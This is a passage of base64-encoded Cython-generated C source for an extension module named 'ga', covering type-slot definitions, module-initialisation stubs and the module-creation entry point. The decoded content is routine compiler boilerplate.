gaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7CiAgaW50IGU7CiAgc3RydWN0IF9fcHl4X29ial8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKW87CiAgewogICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTsKICAgIGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF92X0EpIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfQSwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgcmV0dXJuIDA7Cn0KI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3Nsb3RzW10gPSB7CiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByfSwKICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMmdhX19fcHl4""X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcn0sCiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcn0sCiAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3NwZWMgPSB7CiAgImdhLl9fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciIsCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciksCiAgMCwKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsCiAgX19weXhfdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3Nsb3RzLAp9OwojZWxzZQoKc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPSB7CiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApCiAgImdhLiIiX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIiwgCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciksIAogIDAsIAogIF9fcHl4X3RwX2RlYWxsb2NfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgCiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCAKICAwLCAKICBfX3B5eF90cF90cmF2ZXJzZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIF9fcHl4X3RwX25ld18yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIDAsIAogICNlbHNlCiAgTlVMTCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjEgJiYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAw""eDA3MDMwODAwKQogIDAsIAogICNlbmRpZgogICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMQogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAwLCAKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwCiAgMCwgCiAgI2VuZGlmCn07CiNlbmRpZgoKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21ldGhvZHNbXSA9IHsKICB7MCwgMCwgMCwgMH0KfTsKCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENhY2hlZEJ1aWx0aW5zKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdEdsb2JhbHModm9pZCk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCgoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X2dsb2JhbF9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0""YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X2dsb2JhbF9pbml0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF90eXBlX2luaXRfY29kZSIsIDApOwogIAogICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpIDwgMCkgX19QWVhfRVJSKDAsIDY5LCBf""X3B5eF9MMV9lcnJvcikKICAjZWxzZQogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7CiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikgPCAwKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjsKICB9CiAgI2VuZGlmCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAtMTsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF92YXJpYWJsZV9pbXBvcnRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRI""T05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKc3RhdGljIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVmICpkZWYpOyAKc3RhdGljIGludCBfX3B5eF9weW1vZF9leGVjX2dhKFB5T2JqZWN0KiBtb2R1bGUpOyAKc3RhdGljIFB5TW9kdWxlRGVmX1Nsb3QgX19weXhfbW9kdWxlZGVmX3Nsb3RzW10gPSB7CiAge1B5X21vZF9jcmVhdGUsICh2b2lkKilfX3B5eF9weW1vZF9jcmVhdGV9LAogIHtQeV9tb2RfZXhlYywgKHZvaWQqKV9fcHl4X3B5bW9kX2V4ZWNfZ2F9LAogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogIHtQeV9tb2RfZ2lsLCBQeV9NT0RfR0lMX1VTRUR9LAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAge1B5X21vZF9tdWx0aXBsZV9pbnRlcnByZXRlcnMsIFB5X01PRF9NVUxUSVBMRV9JTlRFUlBSRVRFUlNfTk9UX1NVUFBPUlRFRH0sCiAgI2VuZGlmCiAgezAsIE5VTEx9Cn07CiNlbmRpZgoKI2lmZGVmIF9fY3BsdXNwbHVzCm5hbWVzcGFjZSB7CiAgc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZiA9CiAgI2Vsc2UKICBzdGF0aWMgc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZiA9CiAgI2VuZGlmCiAgewogICAgICBQeU1vZHVsZURlZl9IRUFEX0lOSVQsCiAgICAgICJnYSIsCiAgICAgIDAsIAogICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICAgIHNpemVvZihfX3B5eF9tc3RhdGV0eXBlKSwgCiAgICAjZWxzZQogICAgICAoQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUKSA/IDAgOiAtMSwgCiAgICAjZW5kaWYKICAgICAgX19weXhfbWV0aG9kcyAsCiAgICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAgIF9fcHl4X21vZHVsZWRlZl9zbG90cywgCiAgICAjZWxzZQogICAgICBOVUxMLCAKICAgICNlbmRpZgogICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICAgIF9fcHl4X21fdHJhdmVyc2UsIAogICAgICBfX3B5eF9tX2NsZWFyLCAKICAgICAgTlVMTCAKICAgICNlbHNlCiAgICAgIE5VTEwsIAogICAgICBOVUxMLCAKICAgICAgTlVMTCAKICAgICNlbmRpZgogIH07CiAgI2lmZGVmIF9fY3BsdXNwbHVzCn0gCiNlbmRpZgoKCiNpZm5kZWYgQ1lUSE9OX05PX1BZSU5JVF9FWFBPUlQKICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5TU9ESU5JVF9GVU5DCiNlbHNlCiAgI2lmZGVmIF9fY3BsdXNwbHVzCiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBleHRlcm4gIkMiIFB5""T2JqZWN0ICoKICAjZWxzZQogICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlPYmplY3QgKgogICNlbmRpZgojZW5kaWYKCl9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5SW5pdF9nYSh2b2lkKSBDWVRIT05fU01BTExfQ09ERTsgCl9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5SW5pdF9nYSh2b2lkKQojaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCnsKICByZXR1cm4gUHlNb2R1bGVEZWZfSW5pdCgmX19weXhfbW9kdWxlZGVmKTsKfQoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKc3RhdGljIFBZX0lOVDY0X1QgX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQodm9pZCkgewogICAgewogICAgICAgIFB5T2JqZWN0ICptb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoIl9pbnRlcnByZXRlcnMiKTsgLy8gMy4xMysgSSB0aGluawogICAgICAgIGlmICghbW9kdWxlKSB7CiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7IC8vIGp1c3QgdHJ5IHRoZSAzLjgtMy4xMiB2ZXJzaW9uCiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX3h4c3ViaW50ZXJwcmV0ZXJzIik7CiAgICAgICAgICAgIGlmICghbW9kdWxlKSBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgUHlPYmplY3QgKmN1cnJlbnQgPSBQeU9iamVjdF9DYWxsTWV0aG9kKG1vZHVsZSwgImdldF9jdXJyZW50IiwgTlVMTCk7CiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7CiAgICAgICAgaWYgKCFjdXJyZW50KSBnb3RvIGJhZDsKICAgICAgICBpZiAoUHlUdXBsZV9DaGVjayhjdXJyZW50KSkgewogICAgICAgICAgICBQeU9iamVjdCAqbmV3X2N1cnJlbnQgPSBQeVNlcXVlbmNlX0dldEl0ZW0oY3VycmVudCwgMCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihjdXJyZW50KTsKICAgICAgICAgICAgY3VycmVudCA9IG5ld19jdXJyZW50OwogICAgICAgICAgICBpZiAoIW5ld19jdXJyZW50KSBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgbG9uZyBsb25nIGFzX2NfaW50ID0gUHlMb25nX0FzTG9uZ0xvbmcoY3VycmVudCk7CiAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpOwogICAgICAgIHJldHVybiBhc19jX2ludDsKICAgIH0KICBiYWQ6CiAgICBQeVN5c19Xcml0ZVN0ZGVycigiX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQgZmFpbGVkLiBUcnkgc2V0dGluZyB0aGUgQyBkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUPTBcbiIpOwogICAgcmV0dXJuIC0xOwp9CiNlbmRpZgojaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfY2hlY2tfc2luZ2xlX2ludGVycHJldGVyKHZvaWQpIHsKICAgIHN0YXRpYyBQWV9JTlQ2NF9UIG1haW5faW50ZXJwcmV0ZXJfaWQgPSAtMTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgIFBZX0lOVDY0X1QgY3VycmVu""dF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJREZyb21UaHJlYWRTdGF0ZShQeVRocmVhZFN0YXRlX0dldCgpKTsKI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChQeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCgpOwojZWxzZQogICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycCk7CiNlbmRpZgogICAgaWYgKHVubGlrZWx5KGN1cnJlbnRfaWQgPT0gLTEpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgaWYgKG1haW5faW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHsKICAgICAgICBtYWluX2ludGVycHJldGVyX2lkID0gY3VycmVudF9pZDsKICAgICAgICByZXR1cm4gMDsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkobWFpbl9pbnRlcnByZXRlcl9pZCAhPSBjdXJyZW50X2lkKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAgICAgUHlFeGNfSW1wb3J0RXJyb3IsCiAgICAgICAgICAgICJJbnRlcnByZXRlciBjaGFuZ2UgZGV0ZWN0ZWQgLSB0aGlzIG1vZHVsZSBjYW4gb25seSBiZSBsb2FkZWQgaW50byBvbmUgaW50ZXJwcmV0ZXIgcGVyIHByb2Nlc3MuIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShQeU9iamVjdCAqc3BlYywgUHlPYmplY3QgKm1vZGRpY3QsIGNvbnN0IGNoYXIqIGZyb21fbmFtZSwgY29uc3QgY2hhciogdG9fbmFtZSwgaW50IGFsbG93X25vbmUpCnsKICAgIFB5T2JqZWN0ICp2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgZnJvbV9uYW1lKTsKICAgIGludCByZXN1bHQgPSAwOwogICAgaWYgKGxpa2VseSh2YWx1ZSkpIHsKICAgICAgICBpZiAoYWxsb3dfbm9uZSB8fCB2YWx1ZSAhPSBQeV9Ob25lKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZGRpY3QsIHRvX25hbWUsIHZhbHVlKTsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHZhbHVlKTsKICAgIH0gZWxzZSBpZiAoUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpIHsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSAtMTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVm""ICpkZWYpIHsKICAgIFB5T2JqZWN0ICptb2R1bGUgPSBOVUxMLCAqbW9kZGljdCwgKm1vZG5hbWU7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihkZWYpOwogICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgaWYgKF9fUHl4X2NoZWNrX3NpbmdsZV9pbnRlcnByZXRlcigpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgI2VuZGlmCiAgICBpZiAoX19weXhfbSkKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X20pOwogICAgbW9kbmFtZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgIm5hbWUiKTsKICAgIGlmICh1bmxpa2VseSghbW9kbmFtZSkpIGdvdG8gYmFkOwogICAgbW9kdWxlID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpOwogICAgUHlfREVDUkVGKG1vZG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGJhZDsKICAgIG1vZGRpY3QgPSBQeU1vZHVsZV9HZXREaWN0KG1vZHVsZSk7CiAgICBpZiAodW5saWtlbHkoIW1vZGRpY3QpKSBnb3RvIGJhZDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJsb2FkZXIiLCAiX19sb2FkZXJfXyIsIDEpIDwgMCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgIm9yaWdpbiIsICJfX2ZpbGVfXyIsIDEpIDwgMCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bG